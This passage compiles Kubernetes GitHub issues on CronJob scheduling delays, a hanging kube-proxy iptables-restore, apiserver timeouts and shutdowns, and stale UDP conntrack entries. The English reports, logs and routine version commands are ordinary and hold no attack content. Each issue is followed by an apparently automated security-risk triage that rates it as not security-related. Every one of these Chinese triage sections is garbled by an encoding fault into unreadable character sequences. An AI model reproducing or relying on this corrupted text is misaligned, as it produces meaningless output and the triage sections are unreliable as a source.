ç»åˆ†æï¼Œè¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨DaemonSetè¿›è¡Œæ»šåŠ¨å‡çº§æ—¶ï¼Œå‡ºç°äº†å‡çº§å¡ä½çš„é—®é¢˜ï¼Œå…·ä½“è¡¨ç°ä¸ºæŸä¸ªPodæœªèƒ½æ›´æ–°ï¼Œä»¥åŠDaemonSetåœ¨åˆ é™¤å¼‚å¸¸Podæ—¶ï¼Œæ¯éš”å‡ åˆ†é’Ÿæ‰åˆ é™¤ä¸€ä¸ªPodã€‚è¯¥é—®é¢˜å¯èƒ½ä¸DaemonSetçš„æ§åˆ¶é€»è¾‘æˆ–è°ƒåº¦ç­–ç•¥æœ‰å…³ï¼Œå±äºåŠŸèƒ½æ€§æ•…éšœã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šè¯¥é—®é¢˜æ˜¯æ­£å¸¸çš„åŠŸèƒ½æ€§ç¼ºé™·ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤é—®é¢˜è¿›è¡Œæ”»å‡»ã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´**ï¼šè¯¥é—®é¢˜ä¸ä¼šå¯¼è‡´ç³»ç»Ÿçš„å®‰å…¨æ¼æ´ï¼Œä¸ä¼šè¢«åˆ†é…CVEç¼–å·ï¼Œä¸”æ ¹æ®CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼Œæ­¤é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©è¯„åˆ†ã€‚

6. **å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ï¼šæ­¤Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128881 Cronjobs occasionally run much later than scheduled

- Issue é“¾æ¥ï¼š[#128881](https://github.com/kubernetes/kubernetes/issues/128881)

### Issue å†…å®¹

#### What happened?

CronJobs will occasionally fail to create their Jobs at the scheduled time, with delays ranging from 3 minutes to over 50 minutes. In the most extreme cases we've observed delays over 60 minutes. 

From the kube-controller-manager logs, if I'm understanding correctly (which i may not), it appears that CronJobs rely exclusively on the reconciliation process to trigger Job creation. If no reconciliation occurs around the scheduled time, the Job is not created until a subsequent reconciliation cycle is triggered.

Logs consistently show the following pattern (verbosity set to 8), even for CronJobs that execute on time, this job ran 5 minutes later than scheduled:
```console
I1120 11:05:32.562672       1 cronjob_controllerv2.go:526] "No unmet start times" logger="cronjob-controller" cronjob="camel-test/mkt-cloud-segments-servicecloud-v2-simu-buidar-pp" 
I1120 11:05:32.562702       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" logger="cronjob-controller" cronjob="camel-test/mkt-cloud-segments-servicecloud-v2-simu-buidar-pp" requeueAfter="23h54m27.538988861s"
```
Ocasionally this pattern can also be observed in the kube-controller-manager logs:
```console
E1120 13:33:05.831607       1 cronjob_controllerv2.go:168] error syncing CronJobController golang/datafeeds-download-datafeeds, requeuing: Operation cannot be fulfilled on cronjobs.batch "datafeeds-download-datafeeds": the object has been modified; please apply your changes to the latest version and try again
```

Performing manual actions, such as editing the CronJob object or deleting an old Job, forces an immediate reconciliation and triggers the creation of the pending Job.

Another thing we observed is that the issue only affects cronjobs that run on a daily basis (these are distributed at different times) but those that run frequently, like every 15 minutes, never get delayed.

Things we checked:
1. Control-plane clocks verified: All clocks are synchronized using NTP. No drift observed.
2. Increased logging verbosity: Enabled v=8 for kube-controller-manager
3. The number of cronjobs does not seem to be too much for the size of the cluster and resource utilization

We don't know what could be causing this behavior and we don't know how to continue debugging it further.

#### What did you expect to happen?

CronJobs should create their corresponding Jobs at the scheduled time.

#### How can we reproduce it (as minimally and precisely as possible)?

These are the details of the basic current cluster configuration, however I do not know if the issue could be replicated in another similar cluster.

- Cluster Size: 8 worker nodes, 3 control-plane nodes
- CronJob API Version: batch/v1
- Number of CronJobs: ~100 scheduled at various intervals, distributed in multiple namespaces

Resource Utilization:
- Control-plane nodes have sufficient CPU and memory resources (not near limits).
- The kube-controller-manager pod does not have resource limits set.

#### Anything else we need to know?

Keda operator is installed and we have 3 deployments that are managed by Keda, logs regarding these objects are frequent:
```console
11:46:17.755947 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=0 metric="external metric s0-cron-Europe-Madrid-07xx1-5-021xx1-5(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-activemq-dev,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:17 +0100 CET" scaleTarget="Deployment/activemq-test/activemq-dev"
11:46:17.760043 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=1 metric="external metric s0-cron-Europe-Madrid-0000xxx-5523xxx(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-integracions-erpex,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:17 +0100 CET" scaleTarget="Deployment/camel/integracions-erpex"
11:46:31.385874 graph_builder.go:681] "GraphBuilder process object" logger="garbage-collector-controller" apiVersion="keda.sh/v1alpha1" kind="ScaledObject" object="camel/cron-integracions-erpex" uid="d9d7f22a-0eef-4c21-8c23-7823fc6e1f60" eventType="update" virtual=false
11:46:31.900165 graph_builder.go:681] "GraphBuilder process object" logger="garbage-collector-controller" apiVersion="keda.sh/v1alpha1" kind="ScaledObject" object="activemq-test/cron-activemq-dev" uid="eef2ed20-c9ef-40a2-bee4-3c0fcc71dd5a" eventType="update" virtual=false
11:46:32.782034 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=0 metric="external metric s0-cron-Europe-Madrid-07xx1-5-021xx1-5(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-activemq-dev,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:32 +0100 CET" scaleTarget="Deployment/activemq-test/activemq-dev"
11:46:32.787861 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=1 metric="external metric s0-cron-Europe-Madrid-0000xxx-5523xxx(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-integracions-erpex,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:32 +0100 CET" scaleTarget="Deployment/camel/integracions-erpex"
```

There is a custom operator that observes events on several custom resources.

We've observed this issue through multiple kubernetes versions, no upgrade has fixed it.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.6
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.6
```
</details>


#### Cloud provider

<details>
On premise
</details>


#### OS version

<details>

```console
# On Linux:
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux k8scp02 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```
</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd 1.7.12-0ubuntu2~22.04.1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
vwmare-csi v3.3.1

cilium v1.16.1
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueä¸»è¦æè¿°äº†åœ¨Kubernetesé›†ç¾¤ä¸­ï¼ŒCronJobå¶å°”æ— æ³•æŒ‰è®¡åˆ’æ—¶é—´åˆ›å»ºå¯¹åº”çš„Jobï¼Œå­˜åœ¨å»¶è¿Ÿç°è±¡ã€‚é€šè¿‡æ—¥å¿—å’Œæ’æŸ¥ï¼Œé—®é¢˜å¯èƒ½ä¸CronJobæ§åˆ¶å™¨çš„åè°ƒè¿‡ç¨‹ã€é›†ç¾¤èµ„æºä»¥åŠç¬¬ä¸‰æ–¹ç»„ä»¶ï¼ˆå¦‚Keda operatorã€è‡ªå®šä¹‰operatorï¼‰ç­‰å› ç´ æœ‰å…³ã€‚è¿™æ˜¯ä¸€ä¸ªé›†ç¾¤è°ƒåº¦å’Œè¿ç»´æ–¹é¢çš„é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é—®é¢˜å±äºCronJobè°ƒåº¦å»¶è¿Ÿçš„è¿ç»´é—®é¢˜ï¼Œæœªæ¶‰åŠæ”»å‡»è€…å¯åˆ©ç”¨çš„å®‰å…¨é£é™©ã€‚
2. æ²¡æœ‰è¿¹è±¡è¡¨æ˜è¯¥é—®é¢˜å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œä¸”ä¸ä¼šè¢«åˆ†é…CVEç¼–å·ã€‚
3. Issueå†…å®¹æœªæš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–å­˜åœ¨ä¸å½“æ“ä½œã€‚
4. ä¸æ¶‰åŠæ‹’ç»æœåŠ¡æ”»å‡»çš„é«˜é£é™©æƒ…å†µï¼Œä¸”æ”»å‡»è€…æ— æ³•é€šè¿‡è¯¥é—®é¢˜è¿›è¡Œä»»ä½•å½¢å¼çš„æ”»å‡»æˆ–é€ æˆæ›´å¤§çš„å½±å“ã€‚
5. æ—¥å¿—ä¸­æ²¡æœ‰æ³„éœ²å‡­æ®çš„é£é™©ã€‚
6. å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128879 kube-proxy failed to sync iptables rules due to iptables-restore command don't exit 

- Issue é“¾æ¥ï¼š[#128879](https://github.com/kubernetes/kubernetes/issues/128879)

### Issue å†…å®¹

#### What happened?

kube-proxy can't update iptables rule. found `iptables-restore` command has been executed for a long time(5h-44m-21s).
 
![iptables-restore-time](https://github.com/user-attachments/assets/491cddbc-56d5-4a8b-8be6-0d9c39fc1321)

the process of execute `iptables-restore` belong to kube-proxy

![kube-proxy](https://github.com/user-attachments/assets/4801defb-b802-4ba5-8d91-36d5532f73b1)

the `iptables-restore` command execution did not exit without timeout, blocking the [iptables rule synchronization cronjob](https://github.com/kubernetes/kubernetes/blob/master/pkg/proxy/iptables/proxier.go#L328)

kube-proxy log as below
```
Nov 20 15:23:50 ml-gpu-ser429.nmg01 kube-proxy[3634364]: E1120 15:23:21.690443 3634364 proxier.go:1615] "Failed to execute iptables-restore" err="exit status 4 (iptables-restore v1.8.4 (nf_tables): \nline 26009: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-FUMX47BPHPPPKNON\nline 26010: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-ODGMTJMGUEVYWKRC\n)"
Nov 20 15:23:51 ml-gpu-ser429.nmg01 kube-proxy[3634364]: E1120 15:23:51.788488 3634364 proxier.go:1615] "Failed to execute iptables-restore" err="exit status 4 (iptables-restore v1.8.4 (nf_tables): \nline 25997: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-EUVQAHLVXQN6K7TX\nline 25998: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-2YZVDXPRKK52I4WI\n)"
Nov 20 15:24:51 ml-gpu-ser429.nmg01 kube-proxy[3634364]: E1120 15:24:51.930534 3634364 proxier.go:1615] "Failed to execute iptables-restore" err="exit status 4 (iptables-restore v1.8.4 (nf_tables): \nline 25989: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-6DERLMNL53J5PFHZ\nline 25990: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-CIEL22EO752PNBPK\n)"
```

aslo found a lot of duplicates ipatable rules
![duplicate-rules](https://github.com/user-attachments/assets/88609f60-e18d-443a-a028-3fbcce915d5a)


#### What did you expect to happen?

the `iptables-restore` command execute with timeout

#### How can we reproduce it (as minimally and precisely as possible)?

install v1.21.6 kubernetes(with kube-proxy)ï¼Œand v1.8.4 iptables 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"21+", GitVersion:"v1.21.6-mlpe-20211119", GitCommit:"bebe216b204e80bebf57c1992e61e1857ff2a86d", GitTreeState:"clean", BuildDate:"2021-11-19T10:08:58Z", GoVersion:"go1.16.9", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"21+", GitVersion:"v1.21.6-mlpe-20211119", GitCommit:"bebe216b204e80bebf57c1992e61e1857ff2a86d", GitTreeState:"clean", BuildDate:"2024-10-24T03:10:00Z", GoVersion:"go1.16.3", Compiler:"gc", Platform:"linux/amd64"}
```
we developed based on version 1.21.6, but without modifying the kube-proxy code.
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:

$ cat /etc/os-release
# CentOS Linux release 8.2.2004 (Core) 

$ uname -a
# Linux ml-gpu-ser611.nmg01 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

$ iptables -v
# iptables v1.8.4 (nf_tables): no command specified

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†kube-proxyæ— æ³•æ›´æ–°iptablesè§„åˆ™ï¼ŒåŸå› æ˜¯`iptables-restore`å‘½ä»¤é•¿æ—¶é—´æœªé€€å‡ºï¼Œå¯¼è‡´iptablesè§„åˆ™åŒæ­¥è¢«é˜»å¡ã€‚ä»æä¾›çš„æ—¥å¿—å’Œæè¿°æ¥çœ‹ï¼Œè¿™æ˜¯ç”±äº`iptables-restore`å‘½ä»¤åœ¨æ‰§è¡Œä¸­å‡ºç°é—®é¢˜ï¼Œå¯èƒ½æ˜¯ç³»ç»Ÿæˆ–è½¯ä»¶çš„BUGã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜æœªæ¶‰åŠæ”»å‡»è€…å¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œä¹Ÿæœªæ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å®‰å…¨é£é™©çš„é—®é¢˜ã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128863 apiserver timeouts and random shutdown

- Issue é“¾æ¥ï¼š[#128863](https://github.com/kubernetes/kubernetes/issues/128863)

### Issue å†…å®¹

#### What happened?

I'm running a k8s cluster using `kind`. Currently, there are ~3k agents connected. But in my tests, I frequently see connection timeouts, or connection reset messages from the `apiserver`. Example:
```
â¯ kubectl get pods
Get "https://REDACTED:6443/api/v1/namespaces/default/pods?limit=500": net/http: TLS handshake timeout - error from a previous attempt: read tcp 10.219.21.215:58434->10.219.21.215:6443: read: connection reset by peer
```

Another issue is that the apiserver seems to shutdown without any obvious error message. Here are the logs from apiserver captured when I saw the 'connection reset' error, also indicates apiserver shutdown:
```
E1119 13:37:45.788062       1 writers.go:122] "Unhandled Error" err="apiserver was unable to write a JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:45.788243       1 finisher.go:175] "Unhandled Error" err="FinishRequest: post-timeout activity - time-elapsed: 156.135Âµs, panicked: false, err: context canceled, panic-reason: <nil>" logger="UnhandledError"
E1119 13:37:45.789372       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"http: Handler timeout\"}: http: Handler timeout" logger="UnhandledError"
E1119 13:37:45.791612       1 writers.go:135] "Unhandled Error" err="apiserver was unable to write a fallback JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:45.792698       1 timeout.go:140] "Post-timeout activity" logger="UnhandledError" timeElapsed="4.6593ms" method="POST" path="/api/v1/namespaces/default/events" result=null
E1119 13:37:49.739514       1 writers.go:122] "Unhandled Error" err="apiserver was unable to write a JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.739573       1 finisher.go:175] "Unhandled Error" err="FinishRequest: post-timeout activity - time-elapsed: 24.511Âµs, panicked: false, err: context canceled, panic-reason: <nil>" logger="UnhandledError"
E1119 13:37:49.739805       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"context canceled\"}: context canceled" logger="UnhandledError"
E1119 13:37:49.740573       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"http: Handler timeout\"}: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.740921       1 writers.go:122] "Unhandled Error" err="apiserver was unable to write a JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.741688       1 writers.go:135] "Unhandled Error" err="apiserver was unable to write a fallback JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.741964       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"http: Handler timeout\"}: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.742969       1 timeout.go:140] "Post-timeout activity" logger="UnhandledError" timeElapsed="3.77214ms" method="PATCH" path="/api/v1/namespaces/default/events/58a19fee-2f57-4f96-a4f6-0e70fba87637.1809622ae123cfd8" result=null
E1119 13:37:49.743003       1 writers.go:135] "Unhandled Error" err="apiserver was unable to write a fallback JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.744130       1 timeout.go:140] "Post-timeout activity" logger="UnhandledError" timeElapsed="4.933539ms" method="GET" path="/api/v1/nodes/58a19fee-2f57-4f96-a4f6-0e70fba87637" result=null
E1119 13:39:54.379155       1 compact.go:124] etcd: endpoint ([https://127.0.0.1:2379]) compact failed: etcdserver: mvcc: required revision has been compacted
I1119 13:40:03.367380       1 controller.go:128] Shutting down kubernetes service endpoint reconciler
W1119 13:40:03.391092       1 lease.go:265] Resetting endpoints for master service "kubernetes" to []
I1119 13:40:03.411543       1 controller.go:86] Shutting down OpenAPI V3 AggregationController
I1119 13:40:03.411720       1 cluster_authentication_trust_controller.go:466] Shutting down cluster_authentication_trust_controller controller
I1119 13:40:03.411735       1 storage_flowcontrol.go:187] APF bootstrap ensurer is exiting
I1119 13:40:03.412052       1 available_controller.go:440] Shutting down AvailableConditionController
I1119 13:40:03.412063       1 controller.go:132] Ending legacy_token_tracking_controller
I1119 13:40:03.412067       1 controller.go:133] Shutting down legacy_token_tracking_controller
I1119 13:40:03.412075       1 system_namespaces_controller.go:76] Shutting down system namespaces controller
I1119 13:40:03.412082       1 autoregister_controller.go:168] Shutting down autoregister controller
I1119 13:40:03.412094       1 gc_controller.go:91] Shutting down apiserver lease garbage collector
I1119 13:40:03.412101       1 apf_controller.go:389] Shutting down API Priority and Fairness config worker
```

#### What did you expect to happen?

apiserver shouldn't shutdown, and should work without timeout or connection-reset messages.

#### How can we reproduce it (as minimally and precisely as possible)?

I don't have a minimal reproducer right now. I can describe my set-up in detail, if required.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
â¯ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
Not using Cloud
</details>


#### OS version

<details>

```console
# On Linux:
â¯ cat /etc/os-release
NAME="Red Hat Enterprise Linux"
VERSION="8.10 (Ootpa)"
ID="rhel"
ID_LIKE="fedora"
VERSION_ID="8.10"
PLATFORM_ID="platform:el8"
PRETTY_NAME="Red Hat Enterprise Linux 8.10 (Ootpa)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:redhat:enterprise_linux:8::baseos"
HOME_URL="https://www.redhat.com/"
DOCUMENTATION_URL="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8"
BUG_REPORT_URL="https://issues.redhat.com/"

REDHAT_BUGZILLA_PRODUCT="Red Hat Enterprise Linux 8"
REDHAT_BUGZILLA_PRODUCT_VERSION=8.10
REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="8.10"

â¯ uname -a
Linux born22.toa.des.co 4.18.0-553.22.1.el8_10.x86_64 #1 SMP Wed Sep 11 18:02:00 EDT 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨`kind`è¿è¡Œçš„k8sé›†ç¾¤ä¸­ï¼Œè¿æ¥äº†çº¦3000ä¸ªagentï¼Œåœ¨æµ‹è¯•ä¸­é¢‘ç¹é‡åˆ°è¿æ¥è¶…æ—¶æˆ–è¿æ¥é‡ç½®çš„æƒ…å†µï¼Œapiserverä¹Ÿä¼šéšæœºåœ°å…³é—­ã€‚ç„¶è€Œï¼Œä»æè¿°å’Œæ—¥å¿—ä¸­ï¼Œå¹¶æœªä½“ç°å‡ºå­˜åœ¨å®‰å…¨é£é™©çš„è¿¹è±¡ã€‚é—®é¢˜æ›´åƒæ˜¯ç”±äºé«˜è´Ÿè½½ä¸‹çš„æ€§èƒ½é—®é¢˜ï¼Œå¯¼è‡´apiserveræ— æ³•å¤„ç†å¤§é‡è¯·æ±‚ï¼Œä»è€Œå¼•å‘è¶…æ—¶å’Œæ„å¤–å…³é—­ã€‚è¿™æ˜¯ä¸€ç§ç¨³å®šæ€§å’Œæ€§èƒ½ä¼˜åŒ–çš„é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç¬¬6æ¡ï¼Œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128830 UDP conntrack not cleared when upgrading destination node 

- Issue é“¾æ¥ï¼š[#128830](https://github.com/kubernetes/kubernetes/issues/128830)

### Issue å†…å®¹

#### What happened?

In GKE on Kubernetes `1.30.5-gke.1014001`, when having  UDP stream flow from a Pod on one node to a Pod on another node, if the destination node is upgraded (using GKE's normal node pool upgrade process), then sometimes (about 1 in every 3 tests I've performed), the conntrack entry is not cleared, and the UDP stream continues to be sent towards a now dead Pod.

Note: The Service iTP must be set to Cluster.

#### What did you expect to happen?

That the conntrack entry is cleared.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a DaemonSet (on every node) that can receive UDP traffic on every
2. Configured a Service fronting this DaemonSet, with iTP of Cluster
3. Create a "client" pod that sends UDP (non-stop) to one of the destination Pods
4. Figure out which node is receiving the traffic, and perform a GKE upgrade on it
5. Watch traffic to see if it moves to a new node

Repeat steps 3-5 a few times until the problem happens.

#### Anything else we need to know?

So far I can only reproduce on `1.30.5-gke.1014001`, and only when performing a node-pool upgrade (I don't understand this)

I had assumed that https://github.com/kubernetes/kubernetes/pull/127780 would fix it, which landed in 1.30.5, but it didn't seem to help.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.30.5-gke.1443001
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
GOOGLE_CRASH_ID=Lakitu
KERNEL_COMMIT_ID=46944808c635edfd2bc86fd90d924a6def1e28ac
GOOGLE_METRICS_PRODUCT_ID=26
VERSION=113
VERSION_ID=113
BUILD_ID=18244.151.88
$ uname -a
Linux gke-k8s-gcp-qa1-nodes-frontend-us-cen-52fd96a8-ac7u 6.1.100+ #1 SMP PREEMPT_DYNAMIC Sun Sep 29 16:26:42 UTC 2024 x86_64 Intel(R) Xeon(R) CPU @ 2.80GHz GenuineIntel GNU/Linux
```

</details>


#### Install tools

<details>
GKE's 
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>

/sig network
cc @aojea 


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨GKEä¸Šè¿è¡ŒKubernetes 1.30.5-gke.1014001æ—¶ï¼Œå½“ä¸€ä¸ªPodä¸å¦ä¸€ä¸ªPodä¹‹é—´å­˜åœ¨UDPæµé‡æ—¶ï¼Œå¦‚æœç›®æ ‡èŠ‚ç‚¹è¿›è¡Œå‡çº§ï¼ˆä½¿ç”¨GKEçš„æ­£å¸¸èŠ‚ç‚¹æ± å‡çº§è¿‡ç¨‹ï¼‰ï¼Œæœ‰æ—¶è¿æ¥è·Ÿè¸ªï¼ˆconntrackï¼‰æ¡ç›®ä¸ä¼šè¢«æ¸…é™¤ï¼Œå¯¼è‡´UDPæµé‡ç»§ç»­å‘é€åˆ°å·²ç»ä¸å­˜åœ¨çš„Podã€‚

è¿™ä¸€é—®é¢˜ä¼¼ä¹æ˜¯ç”±äºèŠ‚ç‚¹å‡çº§è¿‡ç¨‹ä¸­ï¼Œè¿æ¥è·Ÿè¸ªè¡¨æ²¡æœ‰æ­£ç¡®æ›´æ–°ï¼Œå¯¼è‡´äº†æµé‡æœªèƒ½é‡æ–°è·¯ç”±åˆ°æ–°çš„Podã€‚ç„¶è€Œï¼Œè¿™ä¸€é—®é¢˜å‘ç”Ÿåœ¨èŠ‚ç‚¹å‡çº§çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å…·æœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½æ‰§è¡ŒèŠ‚ç‚¹å‡çº§æ“ä½œã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ™®é€šæ”»å‡»è€…æ— æ³•è§¦å‘èŠ‚ç‚¹å‡çº§è¿‡ç¨‹ï¼Œåªæœ‰å…·å¤‡ç®¡ç†å‘˜æƒé™çš„äººå‘˜æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šè¯¥é—®é¢˜å¹¶æœªæ¶‰åŠæƒé™æå‡ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ï¼ŒæŒ‰ç…§CVSSè¯„åˆ†æ ‡å‡†ï¼Œé£é™©ç­‰çº§ä¸ä¼šè¾¾åˆ°highä»¥ä¸Šã€‚

4. **åœ¨é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†**ï¼šç”±äºéœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½è¿›è¡ŒèŠ‚ç‚¹å‡çº§ï¼Œä¸”å½±å“èŒƒå›´æœ‰é™ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

6. **å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ï¼šè¯¥Issueä¸»è¦æ¶‰åŠç³»ç»ŸåŠŸèƒ½æ€§ç¼ºé™·ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

